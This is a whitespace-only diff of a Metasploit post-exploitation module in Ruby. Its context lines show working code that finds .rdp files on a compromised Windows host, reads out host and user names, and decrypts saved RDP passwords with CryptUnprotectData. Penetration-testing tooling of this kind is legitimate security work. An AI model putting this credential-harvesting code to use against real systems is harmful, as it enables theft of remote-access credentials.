@@ -5,13 +5,12 @@
 # http://metasploit.com/framework/
 ##
 
-
 require 'msf/core'
 require 'rex'
 require 'msf/core/post/windows/registry'
 
 class Metasploit3 < Msf::Post
-  include Msf::Post::Windows::Registry
+	include Msf::Post::Windows::Registry
 
 	def initialize(info={})
 		super( update_info( info,
@@ -35,7 +34,7 @@ class Metasploit3 < Msf::Post
 		glob = "*.rdp"
 
 		files = client.fs.file.search( docs, glob, recurse )
-	
+
 		if( not files.empty? )
 			files.each do | file |
 				rdpfile = ("#{file['path']}\\#{file['name']}")
@@ -53,7 +52,7 @@ class Metasploit3 < Msf::Post
 
 		print_line("\r")
 		print_status("Found: #{filename}")
-		
+
 		output = ::File.open(filename)
 		output.readlines.each do |line|
 			hex_str = line.gsub("\x00", "")	 #strip the zeroes
@@ -62,13 +61,13 @@ class Metasploit3 < Msf::Post
 				print_status("Host: " + third.rstrip)
 				third = ""
 			end
-			
+
 			if hex_str.match(/^username:s:.*/)
 				third = hex_str.split(':')[2]
 				print_status("User: " + third.rstrip)
 				third = ""
 			end
-			
+
 			if hex_str.match(/^password 51:b:.*/)
 				third = hex_str.split(':')[2]
 				rdppass = (third.rstrip)
@@ -80,13 +79,13 @@ class Metasploit3 < Msf::Post
 			end
 		end
 	end
-	
+
 	def prepare_railgun
 		rg = session.railgun
 		if (!rg.get_dll('crypt32'))
 			rg.add_dll('crypt32')
 		end
-		
+
 		if (!rg.crypt32.functions["CryptUnprotectData"])
 			rg.add_function("crypt32", "CryptUnprotectData", "BOOL", [
 				["PBLOB","pDataIn", "in"],
@@ -119,7 +118,7 @@ class Metasploit3 < Msf::Post
 			ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
 			len, addr = ret["pDataOut"].unpack("Q2")
 		end
-		
+
 		return "" if len == 0
 			decrypted = process.memory.read(addr, len)
 		return decrypted
